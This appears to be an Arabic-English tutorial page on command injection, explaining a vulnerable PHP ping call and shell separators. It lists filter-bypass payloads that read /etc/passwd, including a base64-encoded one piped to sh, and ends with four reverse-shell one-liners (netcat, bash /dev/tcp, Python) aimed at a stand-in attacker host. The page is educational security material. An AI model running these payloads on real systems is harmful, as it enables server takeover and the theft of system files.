حقن الأوامر (Command Injection) — الدليل الشامل

Command Injection (CMDi) — The Ultimate Deep Dive

CRITICAL OWASP A03:2021
AR

ثغرة حقن الأوامر (Command Injection) تحدث عندما يقوم تطبيق الويب بتمرير مدخلات المستخدم إلى أوامر نظام التشغيل (System Shell) لتنفيذها (مثل system(), exec() في PHP، أو os.system() في Python) دون تنظيف كافٍ. هذا يسمح للمهاجم بإلحاق أوامره الخاصة التي تنفذ بصلاحيات خادم الويب، مما يؤدي للسيطرة الكاملة على الخادم (RCE).

EN

Command Injection (CMDi) is a critical vulnerability that occurs when a web application passes unsafe user-supplied data to a system shell. Attackers can leverage this to execute arbitrary operating system commands, leading to full Remote Code Execution (RCE) and system compromise.

آلية العمل والسبب الجذري / Root Cause Analysis

تخيل تطبيقًا يوفر أداة ping لمعرفة حالة شبكة أو IP. الكود الخلفي قد يكون كالتالي:

system("ping -c 4 " . $_GET['ip']);

إذا أدخل المستخدم 127.0.0.1، سيعمل الأمر طبيعياً. ولكن، إذا أدخل المهاجم 127.0.0.1; whoami، فسيقوم السيرفر بتنفيذ أمرين متتاليين بدلاً من أمر واحد:

ping -c 4 127.0.0.1; whoami

الفاصلة المنقوطة ; تنهي الأمر الأول وتبدأ أمرًا جديدًا في بيئة Linux.

أنواع حقن الأوامر وتقنيات الربط / Injection Techniques

1. المعاملات الفاصلة (Separators)

طرق ربط عدة أوامر في Linux و Windows:

  • ; : إنهاء الأمر وبدء آخر (Linux).
  • & : تشغيل الأمر في الخلفية وبدء آخر (Linux/Windows).
  • && : تشغيل الأمر الثاني فقط إذا نجح الأول.
  • | : تمرير مخرجات الأمر الأول للأمر الثاني (Piping).
  • || : تشغيل الأمر الثاني فقط إذا فشل الأول.
  • `command` أو $(command) : التنفيذ المضمن (Inline Execution).

2. Blind Command Injection

عندما لا يعرض التطبيق مخرجات الأمر، نستخدم تقنيات الـ Blind:

  • Time-based: حقن أمر sleep 10 وملاحظة وقت الاستجابة.
  • Out-of-Band (OOB): استخراج البيانات بإرسالها إلى خادم يتحكم فيه المهاجم باستخدام curl, wget, أو إرسال استعلام nslookup.

تخطي الفلاتر (WAF & Filter Bypasses)

AR

في برامج صيد الثغرات (Bug Bounty)، غالبًا ما يتم فلترة مسافات أو كلمات معينة. إليك طرق التخطي:

  • تخطي المسافات (Space Bypass):
    • استخدام المتغيرات: $IFS (مثال: cat$IFS/etc/passwd).
    • استخدام إعادة التوجيه: cat</etc/passwd.
    • استخدام الأقواس: {cat,/etc/passwd}.
  • تخطي الكلمات الممنوعة (Blacklisted Words Bypass):
    • علامات التنصيص: w"h"o"a"m"i أو c'a't /e't'c/p'a's's'w'd.
    • المتغيرات الفارغة: who$@ami أو cat /e$xetc/pass$xwd.
    • الشرطات المائلة المقلوبة (Backslashes): w\h\o\a\m\i.
    • الترميز العكسي (Base64): echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh.

الحصول على Reverse Shell / Remote Shells

أهم خطوة بعد اكتشاف الحقن هي الحصول على جلسة تحكم (Shell) تفاعلية:

# Netcat Traditional
nc -e /bin/sh attacker_ip 4444

# Netcat OpenBSD (No -e flag)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker_ip 4444 > /tmp/f

# Bash Reverse Shell
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Python Reverse Shell
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
